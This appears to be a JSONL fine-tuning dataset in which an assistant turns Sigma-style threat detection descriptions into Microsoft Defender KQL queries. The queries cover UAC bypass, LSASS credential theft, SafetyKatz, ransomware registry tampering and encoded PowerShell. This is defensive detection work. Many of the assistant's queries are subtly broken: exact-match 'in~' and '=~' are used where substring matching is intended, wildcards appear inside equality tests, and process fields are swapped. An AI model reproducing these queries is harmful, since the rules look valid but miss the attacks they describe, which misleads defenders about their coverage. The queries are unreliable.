{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass via WSReset usable by default sysmon-config Topic: proc_creation_win_uac_bypass_wsreset_integrity_level"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\")) and InitiatingProcessFolderPath =~ \"\\\\wsreset.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the registry keys related to \"Trusted Location\" of Microsoft Office. Attackers might add additional trusted locations to avoid macro security restrictions. Topic: registry_set_office_trusted_location"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"Security\\\\Trusted Locations\\\\Location\" and RegistryKey endswith \"\\\\Path\") and (not(((InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Microsoft Office\\\\\" or InitiatingProcessFolderPath contains \":\\\\Program Files (x86)\\\\Microsoft Office\\\\\") or (InitiatingProcessFolderPath has_all (\"\\\\OfficeClickToRun.exe\") and InitiatingProcessFolderPath contains \":\\\\Program Files\\\\Common Files\\\\Microsoft Shared\\\\ClickToRun\\\\\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation attempts of CVE-2022-29072, a 7-Zip privilege escalation and command execution vulnerability.\n7-Zip version 21.07 and earlier on Windows allows privilege escalation (CVE-2022-29072) and command execution when a file with the .7z extension is dragged to the Help>Contents area. This is caused by misconfiguration of 7z.dll and a heap overflow.\nThe command runs in a child process under the 7zFM.exe process.\n Topic: proc_creation_win_exploit_cve_2022_29072_7zip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\", \"pwsh.dll\"))) and InitiatingProcessFileName =~ \"\\\\7zFM.exe\") and (not((((ProcessCommandLine contains \" /c \" or ProcessCommandLine contains \" /k \" or ProcessCommandLine contains \" /r \") or (ProcessCommandLine endswith \".bat\" or ProcessCommandLine endswith \".cmd\" or ProcessCommandLine endswith \".ps1\")) or isnull(ProcessCommandLine))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enabling of the Windows Recall feature via registry manipulation.\nWindows Recall can be enabled by deleting the existing \"DisableAIDataAnalysis\" value, or setting it to 0.\nAdversaries may enable Windows Recall as part of post-exploitation discovery and collection activities.\nThis rule assumes that Recall is already explicitly disabled on the host, and subsequently enabled by the adversary.\n Topic: proc_creation_win_reg_enable_windows_recall"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\reg.exe\" or ProcessVersionInfoOriginalFileName =~ \"reg.exe\") and (ProcessCommandLine in~ (\"Microsoft\\\\Windows\\\\WindowsAI\", \"DisableAIDataAnalysis\")) and ((ProcessCommandLine in~ (\"add\", \"0\")) or ProcessCommandLine =~ \"delete\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the tool PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files Topic: proc_creation_win_hktl_powertool"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\PowerTool.exe\" or FolderPath endswith \"\\\\PowerTool64.exe\") or ProcessVersionInfoOriginalFileName =~ \"PowerTool.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the builtin \"del\"/\"erase\" commands in order to delete files.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversarys footprint.\n Topic: proc_creation_win_cmd_del_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"del \", \"erase \")) and (ProcessCommandLine contains \" -f\" or ProcessCommandLine contains \" /f\" or ProcessCommandLine contains \" \u2013f\" or ProcessCommandLine contains \" \u2014f\" or ProcessCommandLine contains \" \u2015f\" or ProcessCommandLine contains \" -s\" or ProcessCommandLine contains \" /s\" or ProcessCommandLine contains \" \u2013s\" or ProcessCommandLine contains \" \u2014s\" or ProcessCommandLine contains \" \u2015s\" or ProcessCommandLine contains \" -q\" or ProcessCommandLine contains \" /q\" or ProcessCommandLine contains \" \u2013q\" or ProcessCommandLine contains \" \u2014q\" or ProcessCommandLine contains \" \u2015q\") and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "ZipExec is a Proof-of-Concept (POC) tool to wrap binary-based tools into a password-protected zip file. Topic: proc_creation_win_hktl_zipexec"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/generic:Microsoft_Windows_Shell_ZipFolder:filename=\", \".zip\", \"/pass:\", \"/user:\")) or (ProcessCommandLine in~ (\"/delete\", \"Microsoft_Windows_Shell_ZipFolder:filename=\", \".zip\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when adversaries stop services or processes by deleting their respective scheduled tasks in order to conduct data destructive activities Topic: proc_creation_win_schtasks_delete"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"\\\\Windows\\\\BitLocker\", \"\\\\Windows\\\\ExploitGuard\", \"\\\\Windows\\\\SystemRestore\\\\SR\", \"\\\\Windows\\\\UpdateOrchestrator\\\\\", \"\\\\Windows\\\\Windows Defender\\\\\", \"\\\\Windows\\\\WindowsBackup\\\\\", \"\\\\Windows\\\\WindowsUpdate\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\schtasks.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious child process of a Microsoft HTML Help (HH.exe) Topic: proc_creation_win_hh_html_help_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\hh.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\CertReq.exe\", \"\\\\CertUtil.exe\", \"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\installutil.exe\", \"\\\\MSbuild.exe\", \"\\\\MSHTA.EXE\", \"\\\\msiexec.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\schtasks.exe\", \"\\\\wmic.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of SOAPHound, a .NET tool for collecting Active Directory data, using specific command-line arguments that may indicate an attempt to extract sensitive AD information.\n Topic: proc_creation_win_hktl_soaphound_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" --buildcache \", \" --bhdump \", \" --certdump \", \" --dnsdump \")) and (ProcessCommandLine in~ (\" -c \", \" --cachefilename \", \" -o \", \" --outputdirectory\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an svchost process spawning an instance of an office application. This happens when the initial word application creates an instance of one of the Office COM objects such as Word.Application, Excel.Application, etc.\nThis can be used by malicious actors to create malicious Office documents with macros on the fly. (See vba2clr project in the references)\n Topic: proc_creation_win_office_svchost_parent"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\svchost.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\eqnedt32.exe\", \"\\\\excel.exe\", \"\\\\msaccess.exe\", \"\\\\mspub.exe\", \"\\\\powerpnt.exe\", \"\\\\visio.exe\", \"\\\\winword.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process that is masquerading as the legitimate \"svchost.exe\" by naming its binary \"svchost.exe\" and executing from an uncommon location.\nAdversaries often disguise their malicious binaries by naming them after legitimate system processes like \"svchost.exe\" to evade detection.\n Topic: proc_creation_win_svchost_masqueraded_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\svchost.exe\" and (not(((FolderPath in~ (\"C:\\\\Windows\\\\System32\\\\svchost.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\svchost.exe\")) or ProcessVersionInfoOriginalFileName =~ \"svchost.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Microsoft Visual Studio vsls-agent.exe lolbin execution with a suspicious library load using the --agentExtensionPath parameter Topic: proc_creation_win_vslsagent_agentextensionpath_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"--agentExtensionPath\" and InitiatingProcessFolderPath =~ \"\\\\vsls-agent.exe\") and (not(ProcessCommandLine =~ \"Microsoft.VisualStudio.LiveShare.Agent.\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "The Workflow Command-line Compiler can be used for AWL bypass and is listed in Microsofts recommended block rules. Topic: proc_creation_win_lolbin_wfc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\wfc.exe\" or ProcessVersionInfoOriginalFileName =~ \"wfc.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to the \"terminate\" function via wmic in order to kill an application Topic: proc_creation_win_wmic_terminate_application"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"call\", \"terminate\")) and (FolderPath endswith \"\\\\WMIC.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"sc.exe\" to query information about registered services on the system Topic: proc_creation_win_sc_query"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \" query\" and (ProcessVersionInfoOriginalFileName =~ \"sc.exe\" and InitiatingProcessFolderPath =~ \"\\\\sc.exe\")) and (not(ProcessCommandLine =~ \"sc query dokan1\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential exploitation attempts of CVE-2021-41379 (InstallerFileTakeOver), a local privilege escalation (LPE) vulnerability where the attacker spawns a \"cmd.exe\" process as a child of Microsoft Edge elevation service \"elevation_service\" with \"LOCAL_SYSTEM\" rights Topic: proc_creation_win_exploit_cve_2021_41379"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"Cmd.Exe\", \"PowerShell.EXE\", \"pwsh.dll\"))) and (InitiatingProcessFileName =~ \"\\\\elevation_service.exe\" and (InitiatingProcessIntegrityLevel in~ (\"System\", \"S-1-16-16384\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious UTF16 and base64 encoded and often obfuscated PowerShell code often used in command lines Topic: proc_creation_win_powershell_base64_encoded_obfusc"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"IAAtAGIAeABvAHIAIAAwAHgA\", \"AALQBiAHgAbwByACAAMAB4A\", \"gAC0AYgB4AG8AcgAgADAAeA\", \"AC4ASQBuAHYAbwBrAGUAKAApACAAfAAg\", \"AuAEkAbgB2AG8AawBlACgAKQAgAHwAI\", \"ALgBJAG4AdgBvAGsAZQAoACkAIAB8AC\", \"AHsAMQB9AHsAMAB9ACIAIAAtAGYAI\", \"B7ADEAfQB7ADAAfQAiACAALQBmAC\", \"AewAxAH0AewAwAH0AIgAgAC0AZgAg\", \"AHsAMAB9AHsAMwB9ACIAIAAtAGYAI\", \"B7ADAAfQB7ADMAfQAiACAALQBmAC\", \"AewAwAH0AewAzAH0AIgAgAC0AZgAg\", \"AHsAMgB9AHsAMAB9ACIAIAAtAGYAI\", \"B7ADIAfQB7ADAAfQAiACAALQBmAC\", \"AewAyAH0AewAwAH0AIgAgAC0AZgAg\", \"AHsAMQB9AHsAMAB9ACcAIAAtAGYAI\", \"B7ADEAfQB7ADAAfQAnACAALQBmAC\", \"AewAxAH0AewAwAH0AJwAgAC0AZgAg\", \"AHsAMAB9AHsAMwB9ACcAIAAtAGYAI\", \"B7ADAAfQB7ADMAfQAnACAALQBmAC\", \"AewAwAH0AewAzAH0AJwAgAC0AZgAg\", \"AHsAMgB9AHsAMAB9ACcAIAAtAGYAI\", \"B7ADIAfQB7ADAAfQAnACAALQBmAC\", \"AewAyAH0AewAwAH0AJwAgAC0AZgAg\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of SDelete to erase a file not the free space Topic: proc_creation_win_sysinternals_sdelete"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoOriginalFileName =~ \"sdelete.exe\" and (not((ProcessCommandLine in~ (\" -h\", \" -c\", \" -z\", \" /?\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a file named \"MoriyaStreamWatchmen.sys\" in a specific location. This filename was reported to be related to the Moriya rootkit as described in the securelists Operation TunnelSnake report. Topic: file_event_win_moriya_rootkit"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\System32\\\\drivers\\\\MoriyaStreamWatchmen.sys\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the \"msxsl\" binary with an \"http\" keyword in the command line. This might indicate a potential remote execution of XSL files. Topic: proc_creation_win_msxsl_remote_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"http\" and InitiatingProcessFolderPath =~ \"\\\\msxsl.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the abuse of the exefile handler in new file association. Used for bypass of security products. Topic: registry_set_file_association_exefile"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"Classes\\\\.\" and RegistryValueData =~ \"exefile\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects dropping of dll files in system32 that may be used to retrieve user credentials from LSASS Topic: proc_creation_win_reg_credential_access_via_password_filter"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa\", \"reg add\") or ProcessCommandLine startswith \"scecli\\\\0\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of VMware Xfer utility (VMwareXferlogs.exe) from the non-default directory which may be an attempt to sideload arbitrary DLL Topic: proc_creation_win_dll_sideload_vmware_xfer"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\VMwareXferlogs.exe\" and (not(InitiatingProcessFolderPath =~ \"C:\\\\Program Files\\\\VMware\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious RDP session redirect using tscon.exe Topic: proc_creation_win_tscon_rdp_redirect"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \" /dest:rdp-tcp#\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects commandline keywords indicative of potential usge of the tool WinPwn. A tool for Windows and Active Directory reconnaissance and exploitation.\n Topic: proc_creation_win_hktl_winpwn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"Offline_Winpwn\", \"WinPwn \", \"WinPwn.exe\", \"WinPwn.ps1\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may compress or encrypt data that is collected prior to exfiltration using 3rd party utilities Topic: proc_creation_win_7zip_password_compression"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" a \", \" u \")) and (ProcessVersionInfoFileDescription contains \"7-Zip\" or (FolderPath endswith \"\\\\7z.exe\" or FolderPath endswith \"\\\\7zr.exe\" or FolderPath endswith \"\\\\7za.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"7z.exe\", \"7za.exe\"))) and ProcessCommandLine =~ \" -p\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Pingback backdoor that creates ICMP tunnel for C2 as described in the trustwave report Topic: file_event_win_malware_pingback_backdoor"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \"C:\\\\Windows\\\\oci.dll\" and InitiatingProcessFolderPath =~ \"updata.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious parameters of fsutil (deleting USN journal, configuring it with small size, etc).\nMight be used by ransomwares during the attack (seen by NotPetya and others).\n Topic: proc_creation_win_fsutil_usage"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"deletejournal\", \"createjournal\", \"setZeroData\")) and (FolderPath endswith \"\\\\fsutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"fsutil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"mfdetours.dll\". While using \"mftrace.exe\" it can be abused to attach to an arbitrary process and force load any DLL named \"mfdetours.dll\" from the current directory of execution. Topic: image_load_side_load_mfdetours"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\mfdetours.dll\" and (not(FolderPath contains \":\\\\Program Files (x86)\\\\Windows Kits\\\\10\\\\bin\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a schtasks that potentially executes a payload stored in the Windows Registry using PowerShell. Topic: proc_creation_win_schtasks_reg_loader"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"/Create\" and (ProcessCommandLine in~ (\"Get-ItemProperty\", \" gp \")) and (ProcessCommandLine in~ (\"HKCU:\", \"HKLM:\", \"registry::\", \"HKEY_\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")) and (not((ProcessCommandLine in~ (\"FromBase64String\", \"encodedcommand\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Hunts known SVR-specific DLL names. Topic: image_load_apt_cozy_bear_graphical_proton_dlls"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\AclNumsInvertHost.dll\" or FolderPath endswith \"\\\\AddressResourcesSpec.dll\" or FolderPath endswith \"\\\\BlendMonitorStringBuild.dll\" or FolderPath endswith \"\\\\ChildPaletteConnected.dll\" or FolderPath endswith \"\\\\DeregisterSeekUsers.dll\" or FolderPath endswith \"\\\\HandleFrequencyAll.dll\" or FolderPath endswith \"\\\\HardSwapColor.dll\" or FolderPath endswith \"\\\\LengthInMemoryActivate.dll\" or FolderPath endswith \"\\\\ModeBitmapNumericAnimate.dll\" or FolderPath endswith \"\\\\ModeFolderSignMove.dll\" or FolderPath endswith \"\\\\ParametersNamesPopup.dll\" or FolderPath endswith \"\\\\PerformanceCaptionApi.dll\" or FolderPath endswith \"\\\\ScrollbarHandleGet.dll\" or FolderPath endswith \"\\\\UnregisterAncestorAppendAuto.dll\" or FolderPath endswith \"\\\\WowIcmpRemoveReg.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "BlackByte set three different registry values to escalate privileges and begin setting the stage for lateral movement and encryption Topic: registry_set_blackbyte_ransomware"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey in~ (\"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\LocalAccountTokenFilterPolicy\", \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\System\\\\EnableLinkedConnections\", \"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet001\\\\Control\\\\FileSystem\\\\LongPathsEnabled\")) and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a phishing attack which expands a ZIP file containing a malicious shortcut.\nIf the victim expands the ZIP file via the explorer process, then the explorer process expands the malicious ZIP file and drops a malicious shortcut redirected to a backdoor into the Startup folder.\nAdditionally, the file name of the malicious shortcut in Startup folder contains {0AFACED1-E828-11D1-9187-B532F1E9575D} meaning the folder shortcut operation.\n Topic: file_event_win_ripzip_attack"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\", \".lnk.{0AFACED1-E828-11D1-9187-B532F1E9575D}\")) and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "When C# is compiled dynamically, a .cmdline file will be created as a part of the process.\nCertain processes are not typically observed compiling C# code, but can do so without touching disk.\nThis can be used to unpack a payload for execution\n Topic: file_event_win_csharp_compile_artefact"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".cmdline\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe. Topic: image_load_dll_tttracer_module_load"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\ttdrecord.dll\" or FolderPath endswith \"\\\\ttdwriter.dll\" or FolderPath endswith \"\\\\ttdloader.dll\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of whoami.exe with suspicious parent processes. Topic: proc_creation_win_whoami_parent_anomaly"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\whoami.exe\" or ProcessVersionInfoOriginalFileName =~ \"whoami.exe\") and (not(((InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\powershell_ise.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\")) or InitiatingProcessFileName =~ \"\" or isnull(InitiatingProcessFileName)))) and (not(InitiatingProcessFileName =~ \":\\\\Program Files\\\\Microsoft Monitoring Agent\\\\Agent\\\\MonitoringHost.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects non-interactive PowerShell activity by looking at the \"powershell\" process with a non-user GUI process such as \"explorer.exe\" as a parent. Topic: proc_creation_win_powershell_non_interactive_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\"))) and (not(((InitiatingProcessFileName in~ (\":\\\\Windows\\\\explorer.exe\", \":\\\\Windows\\\\System32\\\\CompatTelRunner.exe\", \":\\\\Windows\\\\SysWOW64\\\\explorer.exe\")) or InitiatingProcessFileName =~ \":\\\\$WINDOWS.~BT\\\\Sources\\\\SetupHost.exe\"))) and (not((InitiatingProcessFileName =~ \":\\\\Program Files\\\\WindowsApps\\\\Microsoft.WindowsTerminal_\" or (InitiatingProcessCommandLine =~ \" --ms-enable-electron-run-as-node \" and InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Programs\\\\Microsoft VS Code\\\\Code.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the \"wusa.exe\" (Windows Update Standalone Installer) utility to extract cab using the \"/extract\" argument that is no longer supported.\n Topic: proc_creation_win_wusa_cab_files_extraction"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/extract:\" and InitiatingProcessFolderPath =~ \"\\\\wusa.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the AppInstaller (winget) admin settings. Such as enabling local manifest installations or disabling installer hash checks Topic: registry_set_winget_admin_settings_tampering"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where InitiatingProcessFolderPath =~ \"\\\\winget.exe\" and RegistryKey endswith \"\\\\LocalState\\\\admin_settings\" and RegistryKey =~ \"\\\\REGISTRY\\\\A*\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of the hacktool SafetyKatz via PE information and default Image name Topic: proc_creation_win_hktl_safetykatz"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\SafetyKatz.exe\" or ProcessVersionInfoOriginalFileName =~ \"SafetyKatz.exe\" or ProcessVersionInfoFileDescription =~ \"SafetyKatz\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of wget to download content to a suspicious directory Topic: proc_creation_lnx_wget_download_suspicious_directory"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"/wget\" and (ProcessCommandLine matches regex \"\\\\s-O\\\\s\" or ProcessCommandLine contains \"--output-document\") and ProcessCommandLine =~ \"/tmp/\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects calls to the \"New-NetFirewallRule\" cmdlet from PowerShell in order to add a new firewall rule with an \"Allow\" action.\n Topic: proc_creation_win_powershell_new_netfirewallrule_allow"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"New-NetFirewallRule \", \" -Action \", \"allow\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\powershell_ise.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL sideloading of \"MpSvc.dll\". Topic: image_load_side_load_mpsvc"}, {"role": "assistant", "content": "DeviceImageLoadEvents\n| where FolderPath endswith \"\\\\MpSvc.dll\" and (not((FolderPath startswith \"C:\\\\Program Files\\\\Windows Defender\\\\\" or FolderPath startswith \"C:\\\\ProgramData\\\\Microsoft\\\\Windows Defender\\\\Platform\\\\\" or FolderPath startswith \"C:\\\\Windows\\\\WinSxS\\\\\")))"}]}
